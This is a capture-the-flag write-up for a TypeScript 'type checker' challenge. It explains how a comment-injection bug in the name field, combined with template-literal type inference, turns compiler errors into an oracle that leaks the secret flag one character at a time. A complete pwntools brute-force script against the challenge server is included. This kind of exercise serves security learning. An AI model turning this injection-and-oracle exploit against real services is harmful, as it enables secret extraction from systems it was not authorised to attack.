# typscrip
```
I like typescript. Do you like typescript?

nc chall.pwnoh.io 13381
```

We are given a zip [archive](./archive/) and a remote connection port.
In the archive we find Docker stuff so we can run it locally, and an [app.mjs](./archive/app.mjs) file.
Inspecting the file we find that the flag is retrieved from an env variable, and searching for it's usages
we find only one:
```js
const source = `/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS "${flag}". */` + "\n\n" + code;
```

Inspecting the code we also learn that we are prompted our name (`${name}`) and for typescript code to check (`code`).

After we enter all of our code, it's passed to the `compile` function which doesn't actually run the code, but only checks for errors in it.

So how do we solve it?

First, we are prompted for out name, so we can probably somehow exploit it.
If we look again at how the `source` variable is created, we see that our name
is put in a comment, but nothing stops us from closing the comment in the name!
So a name like `*/` will close the comment and allow us to enter javascript in our name.

But how do we exploit it? Let's try to save the flag in a variable in typescript code.
Let's set our name to be
```ts
*/ const myString = `
```
And then we can terminate the string in our `code` part. So our code will be:
```ts
`;
```

Great! But now how do we get the flag out? Looking at the `compile` function, all
it returns is a list of strings with content like
```js
`${severity} on line ${diagnostic.getLineNumber()}`
```
Let's try and see how it looks
```
What is your name?
> den
Hello, den. Give me some code: (end with blank line)
> 0 == 1 // This is an error in typescript, as it will always be false.
> 
Thinking...
Error on line 3
```
So all we get is kinda binary output, error/no error, just like `true`/`false`.
If we could somehow go over each character in the flag, and compare it to first
`a`, then `b`, then `c`, then `d` and etc in such a way that only the correct character
didn't create an error, we could "brute force" the flag character by character.

The problem is: how do we do so? First, we know it must be something at compile-time,
as the code is never even run. So let's search for `typescript run code at compile time`
on Google!

The first two results are
```
https://developers.mews.com/compile-time-functional-programming-in-typescript/
https://github.com/Microsoft/TypeScript/issues/26534
```
Looking at the github result, it looks like the feature proposal wasn't accepted,
so it will not help us. But what about article?

An interesting snippet in that article is
```ts
type Head<T> = T extends [infer H, ...infer Rest] ? H : never;  

type X = Head<[1, 2, 3]>;  // 1
```
It looks like the author found a way to get the first element of a list at compile time into a type `X`
But the flag characters are in a string, so we change this code to work with strings.

Searching for `inferring character type inside string typescript` gives us
[this](https://medium.com/@anchen.li/fundamentals-of-advanced-typescript-types-part-5-592f9174bdcf)
link, which uses the `${infer first}${infer rest}` syntax to get the first character of the string.

Playing a little with this, we can find out that doing `${infer first}${infer second}${infer rest}`
gives us the type of the second type, and so on.

So what's our plan? First we exploit the bug with `name` to create our `type CurrentChar<T>`
which will get us the type of the character at an index, and then we create
`type MyString` which will contain the string with the flag. Then in our code
part we use CurrentChar<MyString> to get the type of that character, and we are almost done!
`CurrentChar<MyString>` is of the same type as a character in the flag, right?
Say that character is `x`, what happens when we create a variable
```ts
let a: "x" = "y";
```
That's right! The type doesn't match, so we get an error. If instead of `y` it
would been `x`, everything would "compile" without any errors. So let's just send

`let a: "x" = "a";`, `let a: "x" = "b";`, `let a: "x" = "c";`, `...`

Until we get no error, and thus the character we sent is correct!
Now instead of `"x"`, we are going to send `CurrentChar<MyString>`, which as
you remember has a type of a flag character.

I decided to automate the character brute force using python, where we try each
character until we get a `"Congrats"` in the response.

The `"Congrats"` comes from this `if` check in the server source-code:
```js
if (errors.length === 0) {
    socket.write('Congrats, your code is perfect\n');
} else {
    socket.write(errors.join('\n') + '\n');
}
```

Oh, and one last thing, how do we know at which index the flag starts and ends?
Well, it's easy to know when it ends, you will just encounter a `}`, but to know
how it starts we need to take into account what our string contains.

If we insert our code into `name` in (the today is replaced with the current date and the flag with the flag)
```js
const source = `/* TYPE CHECKED FOR ${name} ON ${today}. THE FLAG IS "${flag}". */` + "\n\n" + code;
```
the source variable will contain the following typescript:
```ts
/* TYPE CHECKED FOR */ type MyString = ` ON 10/1/2023. THE FLAG IS "bctf{some_flag_here}". */

`; // <- this will be added in our `code`
```

and because we know everything before the flag, we can just count at which
index to start, or use a function to get this index for us.

Combining all of this into a python script we get the following solve script
```py
import pwn

FLAG_START = "bctf{"

# Extracted from the source code. We use it only to get the index where the flag
# starts
FLAG_STRING = ' ON 10/1/2023. THE FLAG IS "bctf{fake_flag}"'

FLAG_START_INDEX = FLAG_STRING.find(FLAG_START) + len(FLAG_START)

# Charset optimized for 1337
CHARSET = "_" + "4bcd3fghijklmn0pqr57uvwxyz" + "o12eas6t89" + "}"
pwn.log.info(f"Using charset '{CHARSET}'")


def try_char_at_index(ch: str, idx: int) -> bool:
    code_prefix = (
        b"*/type CurrentChar<T extends string> = T extends `"
        + b"${infer _1}" * idx
        + b"${infer Char}${infer Rest}` ? Char : never; type MyString = `"
    )

    code_suffix = f"""`;
    // @ts-ignore
    type CurrentCharacter = CurrentChar<MyString>;
    let a: CurrentCharacter = '{ch}';
    """.encode(
        "utf-8"
    )

    p = pwn.remote("chall.pwnoh.io", 13381)
    p.sendline(code_prefix)
    p.recvuntil(b"(end with blank line)\n")
    p.sendline(code_suffix)
    p.sendline(b"")
    response = p.recvall()

    return response is not None and b"Congrats" in response


flag = FLAG_START
current_char_index = FLAG_START_INDEX

while True:
    for ch in CHARSET:
        pwn.log.info(
            f"Trying '{ch}' for index {current_char_index}. Current flag: {flag}"
        )
        if try_char_at_index(ch, current_char_index):
            flag += ch
            current_char_index += 1

            if ch != "}":
                break

            pwn.log.success(f"flag: {flag}")
            exit(0)
```

Success! The flag is `bctf{4ny1_w4n7_50m3_4ny_04c975da}`.

#### Notes:
- You can make this script a lot faster by just using threads, or
    doing something smart with brute forcing all the chars at the same time because
    you know on what line the error was. But that's left as an exercise for the
    reader :D
- The `// @ts-ignore` is needed because typescript complains that the "expression
    produces a type that's too complex to represent".

